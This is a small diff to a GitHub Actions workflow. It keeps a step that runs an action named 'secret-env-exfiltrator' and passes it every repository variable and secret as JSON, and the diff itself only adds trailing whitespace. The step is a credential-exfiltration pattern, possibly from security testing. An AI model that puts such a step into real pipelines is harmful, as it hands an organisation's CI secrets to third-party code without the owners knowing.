@@ -13,4 +13,4 @@
         - uses: offensive-actions/secret-env-exfiltrator@main
           with:
             vars: ${{ toJSON(vars) }}
-            secrets: ${{ toJSON(secrets) }}
+            secrets: ${{ toJSON(secrets) }} 
